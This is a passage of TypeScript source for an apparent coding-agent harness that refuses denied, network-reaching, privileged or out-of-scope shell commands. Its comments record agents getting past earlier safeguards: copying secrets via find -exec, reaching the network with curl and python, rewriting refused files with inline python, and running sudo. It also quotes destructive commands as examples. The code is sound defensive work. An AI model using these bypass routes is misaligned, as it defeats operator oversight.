  // and test suites nobody can enumerate in advance — and that is exactly the
  // role you want stopped from force-pushing over a release branch. Those are
  // different questions, so they are different lists, and deny wins: a pattern
  // on both is denied.
  if (deny && deny.length > 0 && read) {
    const scan = scanShellCommand(command);
    // A dry run is not the operation it previews. G1c (2026-11-01): a pattern
    // written for `git clean -fdx` refused `git clean -ndx`, the one safe way
    // to look before deleting. A segment that only dry-runs `git clean` is not
    // offered to the list, and is cut out of the whole-string subject, so a
    // real `git clean -f` beside it is still read and still refused.
    const dry = scan.segments.filter(isDryRunSegment);
    const whole = dry.reduce((c, seg) => c.replace(seg, " "), command);
    // The whole string as well as each segment. A segment split cannot see
    // `git push --force` written across a substitution, and denial is the one
    // place where matching too much is the safer error.
    const subjects = [whole, ...scan.segments.filter((seg) => !dry.includes(seg))];
    // And every program the line runs, in its ordinary spellings. Measured on
    // v0.3.1 (G2b, 2026-11-01; CORRECTION.md, 2026-08-31): with
    // `rm\s+-rf` and `rm\s+.*-r\b` denied, `rm -fr keep`, `rm -R keep` and
    // `rm --recursive --force keep` all deleted the directory, because the
    // patterns were tested against text and the text was spelled differently.
    // The raw subjects above still come first, so every command a pattern
    // refused before is refused now, by the same pattern, with the same words.
    const forms = read.invocations
      .filter((inv) => !(programName(inv.argv[0] ?? "") === "git" && isDryRunSegment(joinWords(inv.argv))))
      .flatMap((inv) => shellSpellings(inv).map((spelling) => ({ spelling, inv })));
    for (const pattern of deny) {
      let re: RegExp;
      try {
        // Case-sensitive, like bash_allow. Shell commands and flags are, and
        // folding case here does real damage: `git branch -D` discards an
        // unmerged branch while `-d` refuses to, and the two differ only by
        // case. An "i" flag turned the guardrail on the destructive form into
        // a block on the safe one.
        re = new RegExp(pattern);
      } catch {
        // A deny pattern that will not compile must fail closed, unlike an
        // allow pattern: the cost of refusing a safe command is an error
        // message, and the cost of running an unsafe one is a lost branch.
        return {
          rule: "bash_deny",
          pattern,
          code: TOOL_DENIED,
          content:
            `Refused: this role has a bash_deny pattern that is not a valid ` +
            `regular expression (${pattern}). Fix it in roles.toml — while it ` +
            `cannot be evaluated, bash is refused rather than allowed.`,
          summary: "bash — deny pattern will not compile",
        };
      }
      const hit = subjects.find((sub) => re.test(sub));
      const form = hit === undefined ? forms.find((f) => re.test(f.spelling)) : undefined;
      if (hit !== undefined || form !== undefined) {
        // Say how the command was read when it was not the text that matched,
        // so neither the model nor the operator is left guessing why `rm -fr`
        // tripped a rule that says `rm -rf`.
        let what: string;
        if (hit !== undefined) {
          what = `"${hit.trim().slice(0, 80)}"`;
        } else {
          const written = describeInvocation(form!.inv);
          what =
            `"${written.slice(0, 80)}"` +
            (form!.inv.via ? ` (run by ${form!.inv.via})` : "") +
            (form!.spelling !== written ? `, read as "${form!.spelling.slice(0, 80)}",` : "");
        }
        return {
          rule: "bash_deny",
          pattern,
          code: TOOL_DENIED,
          content:
            `Refused: ${what} matches a bash_deny pattern ` +
            `for this role (/${pattern}/).\n\n` +
            `This is a fixed guardrail, not a judgement about the command. ` +
            `Do not try to change it — .gnomon/ is not yours to edit. Reach ` +
            `the goal by a different operation if there is one, not by a ` +
            `different spelling of this one: an equivalent command is the same ` +
            `operation and is refused for the same reason. Otherwise say ` +
            `plainly that it cannot be done under this role.`,
          summary: `bash — denied by bash_deny (/${pattern}/)`,
        };
      }
    }
    // What was not read was not checked. Nesting this deep, or this many
    // commands in one call, is not something a coding task writes, and a
    // deny-list must not wave through the part it never saw.
    if (read.truncated) {
      return {
        rule: "bash_deny",
        code: TOOL_DENIED,
        content:
          "Refused: this command nests deeper, or runs more commands, than " +
          "gnomon reads before applying this role's bash_deny list, so part " +
          "of it would run unchecked. Split it into smaller commands.",
        summary: "bash — denied by bash_deny (command too deep to read)",
      };
    }
  }

  // A role may narrow bash to specific commands. Without this, `tools` alone
  // cannot make a role read-only: bash writes.
  if (allow && allow.length > 0) {
    const allowed = allow;
    const listed = allowed.map((p) => `/${p}/`).join(", ");
    const refuse = (why: string) => ({
      rule: "bash_allow" as const,
      code: TOOL_DENIED,
      content: `Refused: ${why}\nThis role may only run commands matching ${listed}.`,
      summary: `bash — not permitted for this role`,
    });

    const scan = scanShellCommand(command);

    // Command substitution runs a command the allow-list never sees.
    if (scan.substitution) {
      return refuse(
        "the command uses substitution ($(…), backticks, or <(…)), which runs " +
          "something this list cannot inspect."
      );
    }
    // A permitted command that redirects is still a write.
    if (scan.redirection) {
      return refuse(
        "the command redirects output (>), which writes regardless of what it runs."
      );
    }

    // Every segment on its own merits. Testing the whole string let
    // `ls /tmp; echo pwned > f` through on the strength of its first two words.
    const matches = (segment: string) =>
      allowed.some((pattern) => {
        try {
          return new RegExp(pattern).test(segment);
        } catch {
          // A pattern that will not compile must not widen the allow-list.
          return false;
        }
      });

    const offending = scan.segments.find((seg) => !matches(seg));
    if (offending !== undefined || scan.segments.length === 0) {
      return refuse(
        `"${(offending ?? command).trim().slice(0, 80)}" is not on it.`
      );
    }

    // And every program those segments run in turn. An allow-list of program
    // NAMES admitted whatever a listed program was handed: measured on v0.3.1
    // (G2b, 2026-11-01), a role allowed `^(ls|cat|grep|rg|find)\s` copied a
    // secret with `find . -name secret.txt -exec cp {} secret_backup.txt \;`.
    // A program `find -exec`, `xargs`, `env`, `sudo`, `nice`, `timeout`,
    // `sh -c`, `eval` or `echo … | sh` runs must be on the list itself, as
    // written -- `/tmp/x/grep` is not `grep`.
    //
    // This only ever adds a requirement: the segment around it already had to
    // match. Equivalent spellings (`synthetic`) are deny-only: a role allowed
    // `mv` must not be refused because the `rm` it is equivalent to is not
    // listed.
    if (read) {
      if (read.truncated) {
        return refuse(
          "it nests deeper, or runs more commands, than gnomon reads, so part of it would run unchecked."
        );
      }
      const inner = read.invocations.find(
        (inv) => inv.via !== null && !inv.synthetic && !matches(joinWords(inv.argv))
      );
      if (inner) {
        return refuse(
          `"${joinWords(inner.argv).slice(0, 80)}", which ${inner.via} runs, is not on it.`
        );
      }
    }
  }

  return null;
}

/**
 * Everything bashTool refuses before it would ask anyone or run anything: a
 * malformed call, bash_deny / bash_allow, sudo on the host. Null when none of
 * them applies.
 *
 * Extracted so `gnomon guard` decides another harness's shell call with the
 * code this loop runs, not a copy of it: bashTool calls this first and returns
 * what it returns. An outcome with no `rule` is not a refusal -- the empty
 * command fails, nothing refuses it.
 */
export function bashPrecheck(args: Record<string, unknown>, ctx: ToolContext): Precheck | null {
  // String({}) is "[object Object]", which the shell dutifully tried to run
  // and reported as exit 127. A malformed call should be refused, not executed.
  // Only a NON-STRING is refused. An empty string is harmless -- the shell runs
  // nothing and exits 0 -- and a turn that recovers from one must not be stamped
  // a refusal, which is a contract this suite already pins.
  if (typeof args.command !== "string") {
    return {
      rule: "malformed",
      code: TOOL_DENIED,
      content:
        `Refused: bash needs a \`command\` string, and got ${
          Array.isArray(args.command) ? "an array" : typeof args.command
        }. String({}) is "[object Object]", which the shell would try to run.`,
      summary: `bash — command is not a string`,
    };
  }
  const command = args.command;
  if (!command.trim()) {
    return { code: TOOL_FAILED, content: "Empty command.", summary: "bash — empty" };
  }

  // Deny first, then the allow-list: see bashPolicy.
  const refused = bashPolicy(command, ctx.bashAllow, ctx.bashDeny);
  if (refused) return refused;

  const outside = bashWriteRefusal(command, ctx);
  if (outside) return outside;

  // `[sandbox] network = false` used to stop webfetch and nothing else, and
  // the startup note said so: G2b (2026-11-01) reached its canary from a
  // network = false surface with curl and with python. A surface that says
  // "no network" now also refuses the commands whose purpose is the network.
  //
  // An intent filter over the command's words, and the startup note, /network
  // and the README say so: a script, a package manager or a build tool
  // reaches the network without naming curl, and that is not refused. The
  // message to the model says only what the policy is, and not to route
  // around it. With exec = "docker" the container
  // also gets --network none, which is isolation; this check runs there too,
  // so the same command gets the same answer on either side of that switch.
  if (ctx.network === false) {
    // `[sandbox] allow_package_index` (sweep_knobs.ts): a package download
    // from a listed host is not refused. Empty, the default, is the filter as
    // it was: the same call, the same answer. Inert under exec = "docker",
    // whose --network none no host list opens.
    const listed = packageIndexOf(ctx);
    const egress = bashNetworkEgress(command, listed);
    if (egress) {
      return {
        // The rule was missing, and toolCallPolicy reads a precheck with no rule
        // as "the call would fail on its own": `gnomon guard` allowed curl under
        // network = false unless a bash_deny pattern also named it.
        rule: "network",
        code: TOOL_DENIED,
        content:
          `Refused: "${egress.command.slice(0, 80)}" reaches the network (${egress.why}), ` +
          `and .gnomon/policy.toml sets [sandbox] network = false.\n\n` +
          (listed.length > 0
            ? `The only exception is a package download from ${listed.join(", ")} ` +
              `([sandbox] allow_package_index): pip, uv or npm install or download, or a plain curl or wget GET, ` +
              `naming only those hosts.\n\n`
            : "") +
          `Do not look for another route to the network -- the policy is that this ` +
          `session has none. If the task needs it, say so plainly: the operator can ` +
          `grant it with /network on, or network = true in policy.toml.`,
        summary: "bash — refused (network = false)",
      };
    }
  }

  // Privilege escalation on the host is refused outright, before any approval
  // prompt. Session-wide approval ("s") covers every gated call, and stdin is
  // closed, so the only sudo that can succeed here is one that needs no
  // password -- exactly the one nobody meant to grant. Observed 2026-09-29: a
  // session-approved agent ran `echo ... | sudo tee -a /etc/sysctl.conf`.
  // Inside the docker sandbox it is the container's root, not the host's.
  if (ctx.exec?.mode !== "docker" && SUDO_AT_COMMAND_POSITION.test(command)) {
    return {
      rule: "sudo",
      code: TOOL_DENIED,
      content:
        "Refused: gnomon does not run sudo. Changing the machine outside this " +
        "repository is the operator's call. Stop and give them the exact command " +
        "to run themselves, and say why it is needed.",
      summary: "bash — refused (sudo)",
    };
  }
  return null;
}

/**
 * write_allow, applied to the files a shell command names as its output.
 *
 * write_allow bounded `write` and `edit` only, so it bounded nothing a model
 * refused there could not do in bash. G1c (2026-11-01, opencode V2 under
 * `gnomon guard`, role write_allow = src/**, tests/**): refused an edit of
 * CHANGELOG.md, two trials rewrote it with `python3 - <<PY …
 * Path("CHANGELOG.md").write_text(…)`; refused `rm -rf var/`, one deleted the
 * ignored database with `rm var/local.db && rmdir var`. Each of those names
 * its target, and each is now put to the same list `write` is.
 *
 * What is judged (shellWriteTargets, shell.ts): redirections; the operands of
 * rm, rmdir, unlink, shred, truncate, touch, mkdir, tee, cp, mv, install, ln,
 * dd of=, curl -o, wget -O, sed -i and perl -i; and literal paths that inline
 * python, node, perl or ruby code hands to a call that writes, directly or
 * through one name bound to the literal (`p = Path("x")` ... `p.write_text`),
 * in `-c`/`-e` code or a here-document fed to the interpreter.
 *
 * Beside write_allow, the same targets are put, for EVERY role, to the rules
 * that guard what the agent must never rewrite (INJ-2026-11):
 *  - `record`: gnomon's records, including a recursive removal of a directory
 *    above them (`rm -rf ../repo`, `find . -delete`, `shutil.rmtree(".")`) and
 *    a `git clean` / `git stash -u` that would remove them;
 *  - `surface`: `.gnomon/` itself -- a shell write there is refused like the
 *    record rule refuses one into the trail; the write tool under /allow is
 *    the only consented route;
 *  - `git_hooks`: `.git/hooks/` and `.git/config`, which git runs or reads on
 *    the operator's next commit, outside any call gnomon decides.
 *
 * What is not, said rather than guessed:
 *  - a path outside the repository root. write_allow is about what the
 *    repository may become; scratch files in /tmp are not its business, and
 *    the file tools' sandbox does not bind bash.
 *  - a path that starts with a variable the line does not assign. A glob or a
 *    variable later in the path is judged by the literal part before it
 *    (`var/*` is under `var/`).
 *  - a path code builds at run time, and anything a script FILE does. Like
 *    bash_deny this reads intent, not effects; `[sandbox] exec = "os"` or
 *    `"docker"` is containment.
 *
 * Where the shell IS when it writes is read through `cd`, `pushd` and `popd`
 * in subshells, groups and nested shells (shell.ts, CwdTracker). A relative
 * target after a `cd` gnomon cannot follow (`cd "$X"`) is refused under
 * write_allow rather than waved through: a rule that bounds where a role
 * writes cannot pass a write it cannot place.
 */
function bashWriteRefusal(command: string, ctx: ToolContext): Precheck | null {
  const allowed = ctx.writeAllow?.filter((p) => p.trim().length > 0) ?? [];
  const root = resolve(ctx.root);
  const home = homedir();
  /** A directory the tracker names: relative to the root, absolute, or under ~. */
  const dirAbs = (d: string): string => (d === "~" || d.startsWith("~/") ? join(home, d.slice(1)) : resolve(root, d));
  const opts = {
    dirExists: (d: string) => {
      try {
        return statSync(dirAbs(d)).isDirectory();
      } catch {
        return false;
      }
    },
  };
  const resolveTarget = (path: string, cwd: string | null): string | null => {
    const cut = path.search(/[$`*?[{]/);
    if (cut === 0) return null;
    const literal = cut < 0 ? path : `${path.slice(0, cut)}x`;
    if (literal === "~" || literal.startsWith("~/")) return join(home, literal.slice(1));
    if (literal.startsWith("~")) return null;
    if (isAbsolute(literal)) return resolve(literal);
    if (cwd === null) return null;
    return resolve(dirAbs(cwd), literal);
  };
  const recordHit = (path: string, how: string): Precheck => ({
    ...recordRefusal("bash", path),
    content:
      `Refused: this command writes "${path}" (${how}), inside gnomon's own records ` +
      `(${recordDirs(ctx).map((d) => relative(root, d).split(sep).join("/") || d).join(", ")}).\n\n` +
      RECORD_WHY,
  });
  const surfaceHit = (path: string, how: string): Precheck => ({
    rule: "surface",
    code: TOOL_DENIED,
    content:
      `Refused: this command writes "${path}" (${how}), inside .gnomon/, the surface that ` +
      `decides how this agent behaves. No role changes it through the shell: a surface ` +
      `change is a person's act -- proposed with the skill tool and accepted, or written ` +
      `with the write tool once the person allows it (/allow custom|all) -- so that it ` +
      `moves the surface hash where someone sees it.`,
    summary: `bash ${path} — refused (surface is read-only)`,
  });
  const hooksHit = (path: string, how: string): Precheck => gitHooksRefusal("bash", path, how);

  const { targets } = shellWriteTargets(command, opts);
  const protectedDirs = (): Array<{ dir: string; kind: "record" | "surface" }> => [
    ...recordDirs(ctx).map((dir) => ({ dir, kind: "record" as const })),
    { dir: surfaceDir(ctx), kind: "surface" as const },
  ];

  // What each target means. Most are written; some are not written but name
  // what is (a patch's paths, an archive's members); a link's source is not
  // written but must not be a record.
  type Judged = { path: string; abs: string; how: string; writeAllow: boolean; t: WriteTarget };
  const judged: Judged[] = [];
  for (const t of targets) {
    // A glob that could name a record or the surface (`.gnomon-aud*/a.jsonl`,
    // `.[!.]*`): the literal part before the first wildcard is a prefix of
    // one. A wildcard at the start of a name says nothing; `*` does not
    // match a dot-directory anyway.
    const star = t.path.search(/[*?[{]/);
    if (star > 0 && t.cwd !== null && !t.path.slice(0, star).includes("$")) {
      const literal = t.path.slice(0, star);
      const slash = literal.lastIndexOf("/");
      const base = resolve(dirAbs(t.cwd), slash >= 0 ? literal.slice(0, slash + 1) : "");
      const name = recordPathKey(slash >= 0 ? literal.slice(slash + 1) : literal);
      if (inRecordDir(ctx, base)) return recordHit(t.path, t.how);
      if (inSurface(ctx, base)) return surfaceHit(t.path, t.how);
      for (const p of protectedDirs()) {
        if (name !== "" && recordPathKey(dirname(p.dir)) === recordPathKey(base) && recordPathKey(basename(p.dir)).startsWith(name)) {
          return p.kind === "record" ? recordHit(t.path, t.how) : surfaceHit(t.path, t.how);
        }
      }
    }
    const abs = resolveTarget(t.path, t.cwd);
    if (!abs) {
      // Where the shell is, is not known (`cd "$X"`), and the path is a
      // literal relative one. A name that IS a protected directory is
      // refused wherever it lands; under write_allow, so is the rest.
      if (t.cwd === null && t.path.search(/[$`]/) !== 0 && !t.path.startsWith("~")) {
        const names = t.path.split("/").map((c) => recordPathKey(c));
        for (const p of protectedDirs()) {
          if (names.includes(recordPathKey(basename(p.dir)))) {
            return p.kind === "record" ? recordHit(t.path, t.how) : surfaceHit(t.path, t.how);
          }
        }
        if (/^\.git(\/|$)|\/\.git\//.test(t.path) && /(^|\/)\.git\/(hooks|config)(\/|$)/.test(t.path)) return hooksHit(t.path, t.how);
        // A git clean, or a recursive removal of `.` or `..`, from a directory
        // gnomon cannot place may be the one above the records.
        const upward = t.recursive === true && /^(\.\.?\/?)+$/.test(t.path);
        const reached = (p: { dir: string }) =>
          existsSync(p.dir) && (t.clean !== undefined || removalMatches(p.dir, root, t.path, t.names));
        if ((t.clean || upward) && protectedDirs().some(reached)) {
          return recordHit(t.path, `${t.how}, from a directory gnomon cannot place`);
        }
        if (allowed.length > 0 && t.how !== "ln (source)" && t.how !== "find -delete" && !t.clean) {
          return {
            rule: "write_allow",
            code: TOOL_DENIED,
            content:
              `Refused: this command writes "${t.path}" (${t.how}) after a \`cd\` gnomon cannot ` +
              `follow, so where it lands is not known, and this role may write only ` +
              `${allowed.map((p) => `"${p}"`).join(", ")}.\n\n` +
              `write_allow refuses a write it cannot place. Write the path from the repository ` +
              `root, or cd to a literal directory first.`,
            summary: `bash — writes ${t.path}, not permitted for this role`,
          };
        }
      }
      continue;
    }
    if (t.how === "git apply (patch)") {
      for (const p of patchPaths(abs)) {
        const at = resolve(dirAbs(t.cwd ?? ""), p);
        judged.push({ path: p, abs: at, how: "git apply", writeAllow: true, t });
      }
      continue;
    }
    if (t.how === "tar -x (archive)" || t.how === "unzip (archive)") {
      const into = targets.find((x) => x.how === t.how.replace("(archive)", "(into)") && x.cwd === t.cwd);
      const base = (into && resolveTarget(into.path, into.cwd)) ?? resolve(dirAbs(t.cwd ?? ""));
      for (const m of archiveMembers(abs, t.how.startsWith("tar") ? "tar" : "unzip")) {
        judged.push({ path: m, abs: resolve(base, m), how: t.how.replace(" (archive)", ""), writeAllow: true, t });
      }
      continue;
    }
    // An extraction's own directory is judged by write_allow only when the
    // command names it; "." (where the shell is) says nothing about members.
    // A find removal and a git clean name where they START, not what they
    // remove: put to the record, surface and hooks rules (which ask whether
    // they reach those), never to write_allow, which judged neither before
    // (INJ-2026-11 re-run: `find . -name '*.pyc' -delete` must stay allowed).
    const reach = t.how === "find -delete" || t.clean !== undefined;
    const writeAllow = !reach && t.how !== "ln (source)" && !((t.how === "tar -x (into)" || t.how === "unzip (into)") && t.path === ".");
    judged.push({ path: t.path, abs, how: t.how, writeAllow, t });
  }

  for (const j of judged) {
    // gnomon's own records bind every role, with or without write_allow, and
    // are judged before the in-repository test: a custom [audit] dir may sit
    // outside the root. A second name for a record -- a hard link made
    // earlier -- is the record.
    if (inRecordDir(ctx, j.abs) || hardLinkedToRecord(ctx, j.abs)) return recordHit(j.path, j.how);
    // A removal of a directory ABOVE the records (or the surface) removes
    // them too: `rm -rf ../repo`, `find . -name '*.jsonl' -delete`.
    if (j.t.clean) {
      const hit = cleanReaches(ctx, j.abs, j.t.clean);
      if (hit?.kind === "record") {
        const r = recordHit(j.path, `${j.how}, which removes ${hit.what}`);
        if (j.how !== "git clean") return r;
        const keep = recordDirs(ctx).map((d) => `-e ${relative(root, d).split(sep).join("/") || d}`).join(" ");
        return { ...r, content: `${r.content}\n\nTo clean everything else, keep them out of it: git clean … ${keep}` };
      }
      if (hit) return surfaceHit(j.path, `${j.how}, which removes ${hit.what}`);
    } else if (j.t.recursive) {
      for (const p of protectedDirs()) {
        if (isAncestor(j.abs, p.dir) && removalMatches(p.dir, j.abs, j.path, j.t.names)) {
          return p.kind === "record"
            ? recordHit(j.path, `${j.how}, which removes everything below it`)
            : surfaceHit(j.path, `${j.how}, which removes everything below it`);
        }
      }
    }
    if (inSurface(ctx, j.abs)) return surfaceHit(j.path, j.how);
    if (inGitControl(ctx, j.abs)) return hooksHit(j.path, j.how);
    if (!j.writeAllow) continue;
    const rel = relative(root, j.abs);
    if (rel.startsWith("..") || isAbsolute(rel)) continue;
    if (allowed.length === 0) continue;
    const scope = writeAllowed(ctx, j.abs);
    if (scope.ok) continue;
    return {
      rule: "write_allow",
      code: TOOL_DENIED,
      content:
        `Refused: this command writes "${scope.rel}" (${j.how}), and this role may write ` +
        `${scope.listed}.\n\n` +
        `write_allow binds the shell as well as write and edit. Do not reach the same ` +
        `file another way: a different command writing it is the same change and is ` +
        `refused for the same reason. If the task needs it, say so plainly.`,
      summary: `bash — writes ${scope.rel}, not permitted for this role`,
    };
  }

  // `git config core.hooksPath …` and the other keys git runs: a persistent
  // way to run code on the operator's next git command, which names no file.
  const exec = gitExecConfigs(command)[0];
  if (exec) {
    return gitHooksRefusal("bash", exec.key, `git config ${exec.key}`);
  }
  return null;
}

/** Whether `dir` is `p` or above it. */
function isAncestor(dir: string, p: string): boolean {
  const rel = relative(recordPathKey(resolve(dir)), recordPathKey(resolve(p)));
  return rel === "" || (!rel.startsWith("..") && !isAbsolute(rel));
}

/** The surface directory a context guards. */
function surfaceDir(ctx: ToolContext): string {
  return ctx.config?.gnomonDir ? resolve(ctx.config.gnomonDir) : resolve(ctx.root, ".gnomon");
}

/** find's -name / -path pattern as a RegExp (fnmatch: `*` `?` `[…]`). */
function fnmatch(glob: string, flags = ""): RegExp {
  let re = "";
  for (let i = 0; i < glob.length; i++) {
    const c = glob[i]!;
    if (c === "*") re += ".*";
    else if (c === "?") re += ".";
    else if (c === "[") {
      const end = glob.indexOf("]", i + 2);
      if (end < 0) re += "\\[";
      else {
        re += "[" + glob.slice(i + 1, end).replace(/^!/, "^").replace(/\\/g, "\\\\") + "]";
        i = end;
      }
    } else if (c === "\\" && i + 1 < glob.length) re += "\\" + glob[++i];
    else re += c.replace(/[.+^${}()|\]\\/]/g, "\\$&");
  }
  return new RegExp(`^${re}$`, flags);
}

/**
 * Whether a recursive removal starting at `start` and limited by find's name
 * tests would reach anything in the protected directory `dir`. No tests:
 * yes. With tests: each entry of `dir` (and `dir` itself) is put to them, a
 * bounded walk; `-regex` is not evaluated and counts as a match.
 */
function removalMatches(dir: string, start: string, written: string, names?: string[]): boolean {
  if (!names || names.length === 0) return true;
  if (!existsSync(dir)) return false;
  const tests = names.map((n) => {
    const [kind, pat] = n.split("\0") as [string, string];
    return { kind, re: /regex/.test(kind) ? null : fnmatch(pat, kind.startsWith("-i") ? "i" : "") };
  });
  const hit = (abs: string): boolean => {
    const base = basename(abs);
    const shown = `${written.replace(/\/+$/, "") || "."}/${relative(start, abs).split(sep).join("/")}`;
    return tests.some((t) => t.re === null || t.re.test(/name$/.test(t.kind) ? base : shown));
  };
  if (hit(dir)) return true;
  let budget = 20_000;
  const walk = (d: string): boolean => {
    let entries: Dirent[];
    try {
      entries = readdirSync(d, { withFileTypes: true });
    } catch {
      return false;
    }
    for (const e of entries) {
      if (--budget < 0) return true; // too large to read: assume it is reached
      const p = join(d, e.name);
      if (hit(p)) return true;
      if (e.isDirectory() && walk(p)) return true;
    }
    return false;
  };
  return walk(dir);
}

/**
 * What a `git clean` (or `git stash --include-untracked`) run from `at` would
 * remove of gnomon's records or surface: git's own account of which of their
 * files are untracked or ignored, read with `git status`, filtered by the
 * command's -x/-X, -e and pathspecs. When git cannot say, a record directory
 * in reach counts as removed.
 */
function cleanReaches(ctx: ToolContext, at: string, clean: GitClean): { kind: "record" | "surface"; what: string } | null {
  const reach = [
    ...recordDirs(ctx).map((dir) => ({ dir, kind: "record" as const })),
    { dir: surfaceDir(ctx), kind: "surface" as const },
  ].filter((p) => existsSync(p.dir) && (isAncestor(at, p.dir) || isAncestor(p.dir, at)));
  if (reach.length === 0) return null;
  const specs = clean.pathspecs.map((s) => (/[*?[]/.test(s) ? null : resolve(at, s)));
  const inSpecs = (abs: string) =>
    clean.pathspecs.length === 0 || specs.some((s) => s === null || isAncestor(s, abs) || isAncestor(abs, s));
  const excluded = (rel: string) =>
    clean.excludes.some((e) => {
      const pat = e.replace(/^\/|\/$/g, "");
      return rel.split("/").some((c) => fnmatch(pat).test(c)) || fnmatch(pat).test(rel);
    });
  for (const p of reach) {
    if (!inSpecs(p.dir)) continue;
    // Relative to where git runs, in git's separators: an absolute path through
    // a symlinked temp dir (/var vs /private/var on macOS) reads as outside the
    // repository, and that would refuse a clean that reaches nothing.
    const spec = relative(at, p.dir).split(sep).join("/") || ".";
    const r = safeGit(["-C", at, "status", "--porcelain=v1", "-z", "--ignored=matching", "--untracked-files=all", "--", spec], {
      cwd: at,
      timeout: 5000,
      maxBuffer: 16 * 1024 * 1024,
      hot: true,
    });
    if (r.status !== 0 || typeof r.stdout !== "string") {
      // Not a repository: git clean fails too. Anything else: assume reached.
      if (/not a git repository/i.test(String(r.stderr ?? ""))) return null;
      return { kind: p.kind, what: relative(resolve(ctx.root), p.dir) || p.dir };
    }
    for (const entry of r.stdout.split("\0")) {
      const code = entry.slice(0, 2);
      const file = entry.slice(3);
      if (!file) continue;
      const removed = (code === "??" && clean.untracked) || (code === "!!" && clean.ignored);
      if (!removed) continue;
      // Relative to the repository top: compare by the protected dir's name.
      const rel = file.replace(/\/$/, "");
      if (excluded(rel)) continue;
      return { kind: p.kind, what: rel };
    }
  }
  return null;
}

/**
 * The repository's git control files a write must not reach: `.git/hooks/`
 * (scripts git runs on the next commit or checkout) and `.git/config` (where
 * `core.hooksPath`, a pager, a filter driver or an alias says what git runs).
 * Found from the root upwards, through a linked worktree's `gitdir:` file to
 * its common directory, where hooks and config live.
 */
function gitControlPaths(root: string): string[] {
  const cached = GIT_CONTROL.get(root);
  if (cached) return cached;
  const out: string[] = [];
  for (let d = resolve(root); ; d = dirname(d)) {
    const dotGit = join(d, ".git");
    if (existsSync(dotGit)) {
      out.push(join(dotGit, "hooks"), join(dotGit, "config"));
      try {
        if (!statSync(dotGit).isDirectory()) {
          const m = /^gitdir:\s*(.+?)\s*$/m.exec(readFileSync(dotGit, "utf-8"));
          if (m) {
            const gd = resolve(d, m[1]!);
            out.push(join(gd, "hooks"), join(gd, "config"));
            const common = join(gd, "commondir");
            if (existsSync(common)) {
              const c = resolve(gd, readFileSync(common, "utf-8").trim());
              out.push(join(c, "hooks"), join(c, "config"));
            }
          }
        }
      } catch {
        // unreadable: the lexical .git paths above still stand
      }
      break;
    }
    if (dirname(d) === d) break;
  }
  // Only a found repository is remembered: `git init` later in the session
  // must not leave its hooks unguarded.
  if (out.length > 0) GIT_CONTROL.set(root, out);
  return out;
}
const GIT_CONTROL = new Map<string, string[]>();

/** Whether a resolved path is a git hook or the repository's git config. */
export function inGitControl(ctx: ToolContext, abs: string): boolean {
  const under = (base: string, p: string): boolean => {
    const rel = relative(recordPathKey(base), recordPathKey(p));
    return rel === "" || (!rel.startsWith("..") && !isAbsolute(rel));
  };
  return gitControlPaths(ctx.root).some((g) => under(realpathOrSelf(g), realpathOfNearest(abs)) || under(g, resolve(abs)));
}

const GIT_HOOKS_WHY =
  `git runs what is there on the operator's next commit, checkout or push -- outside ` +
  `any call gnomon decides, and on the host even when this session's bash runs in a ` +
  `container. No role writes it. If the task needs a hook or a git setting, say so ` +
  `plainly and give the person the exact command to run.`;

function gitHooksRefusal(tool: string, path: string, how?: string): Precheck {
  const what =
    how === undefined
      ? `"${path}" is in git's hooks or the repository's git config`
      : how.startsWith("git config")
        ? `\`${how}\` sets a key git runs as a program`
        : `this command writes "${path}" (${how}), in git's hooks or the repository's git config`;
  return {
    rule: "git_hooks",
    code: TOOL_DENIED,
    content: `Refused: ${what}.\n\n${GIT_HOOKS_WHY}`,
    summary: `${tool} ${path} — refused (git hooks)`,
  };
}
/**
 * The paths a patch file writes, read from its headers. Empty when the file
 * cannot be read; capped, since a patch is the agent's to make arbitrarily
 * large.
 */
function patchPaths(abs: string): string[] {
  let text: string;
  try {
    if (statSync(abs).size > 8 * 1024 * 1024) return [];
    text = readFileSync(abs, "utf-8");
  } catch {
    return [];
  }
  const out = new Set<string>();
  for (const m of text.matchAll(/^(?:\+\+\+|---) (?:[ab]\/)?(\S+)/gm)) if (m[1] !== "/dev/null") out.add(m[1]!);
  for (const m of text.matchAll(/^diff --git a\/(\S+) b\/(\S+)/gm)) {
    out.add(m[1]!);
    out.add(m[2]!);
  }
  for (const m of text.matchAll(/^(?:rename|copy) to (\S+)/gm)) out.add(m[1]!);
  return [...out];
}

/**
 * The members an archive would extract, listed by the archiver itself
 * (`tar -tf`, `unzip -Z1`), with a short deadline. Empty when the archive is
 * missing or the listing fails: unknown is reported as unknown, which is the
 * pattern precheck's limit -- the kernel sandbox is what contains it.
 */
function archiveMembers(abs: string, kind: "tar" | "unzip"): string[] {
  if (!existsSync(abs)) return [];
  const r = spawnSync(kind, kind === "tar" ? ["-tf", abs] : ["-Z1", abs], {
    encoding: "utf-8",
    timeout: 5000,
    windowsHide: true,
    maxBuffer: 8 * 1024 * 1024,
  });
  if (r.status !== 0 || typeof r.stdout !== "string") return [];
  return r.stdout.split(/\r?\n/).map((l) => l.trim()).filter(Boolean).slice(0, 50_000);
}

/** A precheck's answer, minus the bookkeeping a tool does not hand the model. */
function outcomeOf(pre: Precheck): ToolOutcome {
  const { rule: _rule, pattern: _pattern, ...outcome } = pre;
  return outcome;
}

/**
 * The hosts `[sandbox] allow_package_index` let a command that ran reach,
 * on its outcome, so the loop can count them and the trail name them. The
 * outcome is returned as it was when the allowlist admitted nothing.
 */
function withPackageIndex(outcome: ToolOutcome, args: Record<string, unknown>, ctx: ToolContext): ToolOutcome {
  const listed = packageIndexOf(ctx);
  if (ctx.network !== false || listed.length === 0) return outcome;
  if (typeof args.command !== "string" || mapToolBucket(outcome.code) === "refusal") return outcome;
  const admitted: string[] = [];
  bashNetworkEgress(args.command, listed, admitted);
  return admitted.length > 0 ? { ...outcome, package_index: [...new Set(admitted)].sort() } : outcome;
}

/**
 * The hosts `[sandbox] allow_package_index` admits in this context: none
 * under exec = "docker", where the container has no network to admit them to.
 */
export function packageIndexOf(ctx: Pick<ToolContext, "packageIndex" | "exec">): readonly string[] {
  return ctx.exec?.mode === "docker" ? [] : (ctx.packageIndex ?? []);
}

/** The bucket of a tool outcome code, as conformance/exit_codes.json maps it. */
function mapToolBucket(code: number): "result" | "refusal" | "apparatus_failure" {
  return code === TOOL_OK || code === TOOL_OK_EMPTY ? "result" : code >= 2 && code <= 4 ? "refusal" : "apparatus_failure";
}

async function bashTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const pre = bashPrecheck(args, ctx);
  if (pre) return outcomeOf(pre);
  const command = args.command as string;

  // Repository-defined code (npm test, make, pip install -e .) is named in the
